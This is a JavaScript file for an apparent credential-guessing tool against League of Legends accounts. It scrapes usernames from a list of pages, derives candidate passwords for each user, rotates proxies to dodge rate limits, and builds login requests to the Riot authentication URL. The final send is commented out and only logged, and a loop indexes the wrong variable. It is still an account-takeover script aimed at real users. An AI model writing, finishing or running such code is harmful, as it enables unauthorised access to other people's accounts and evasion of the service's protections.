/* eslint-disable no-await-in-loop */
const { uuid } = require('uuidv4');

const { NODE_ENV, RIOT_AUTH_URL } = require('../commons/env');
const { getNNumbers } = require('../commons/numbers');
const { haveSameElements } = require('../commons/arrays');
const rollbar = require('../commons/rollbar');
const { getProxy, getProxyInfo } = require('../commons/proxy');
const { axios } = require('../commons/request');
const proxies = require('../constants/proxies');
const urls = require('../constants/urls');
const { getPasswordSet } = require('../constants/tests');

const { getUsers } = require('./get_users');

const interval = 10000;
const requestInterval = 1000;
const minPageNum = 13;
const states = urls.map((url, i) => ({ url, pageNum: minPageNum + i, lastUsers: [] }));
let lastProxy = null;

const changeProxy = async () => {
  const proxy = getProxy();
  const { host, port } = getProxyInfo();
  if (proxy !== lastProxy) {
    lastProxy = proxy;
    await axios({
      options: {
        method: 'post',
        url: RIOT_AUTH_URL,
        proxy: { host, port, protocol: 'http' },
        headers: { 'Content-Type': 'application/json' },
        data: {
          client_id: 'rso-web-client-prod',
          login_hint: 'las',
          redirect_uri: 'https://login.leagueoflegends.com/oauth2-callback',
          response_type: 'code',
          scope: 'openid',
          state: uuid()
        }
      },
      persist: true
    });
  }
  return { host, port, protocol: 'http' };
};
const testCredentials = async (username, password, proxyConfig) => {
  const options = {
    method: 'put',
    url: RIOT_AUTH_URL,
    proxy: proxyConfig,
    headers: { 'Content-Type': 'application/json' },
    data: {
      language: 'es-ES',
      password,
      remember: false,
      type: 'auth',
      username
    }
  };
  console.log('options', options);
  // await axios({ options, persist: true });
};
const requestUsers = async (url, state) => {
  // User list request
  const userResp = await axios({
    options: { url },
    persist: true
  });
  if (!userResp) return;
  const users = getUsers(userResp.body);
  console.log('Comparing with', url);
  if (haveSameElements(users, state.lastUsers)) {
    console.log('Same elements', users, state.lastUsers);
    state.pageNum = minPageNum;
    return;
  }
  for (let i = 0; i < users.length; i += 1) {}
  // console.log('Got Users from', url, users);
  state.lastUsers = users;
  state.pageNum += 1;
  let time = 2;
  for (let i = 0; i < users.length; i += 1) {
    const user = users[i];
    const passwords = getPasswordSet(user);
    const proxyConfig = await changeProxy();
    for (let ii = 0; ii < passwords.length; ii += 1) {
      setTimeout(testCredentials, time, user, passwords[i], proxyConfig);
      time += requestInterval;
    }
  }
};

const execute = () =>
  setTimeout(async () => {
    const pages = getNNumbers(urls.length - 1);
    for (let i = 0; i < states.length; i += 1) {
      const state = states[i];
      const { pageNum, lastUsers } = states[i];
      const url = `${states[i].url}${states[i].pageNum}`;
      requestUsers(url, state);
    }
    execute();
  }, interval);

if (NODE_ENV !== 'localhost' && +process.env.threadID === 1) execute();
// TODO remove
// execute();
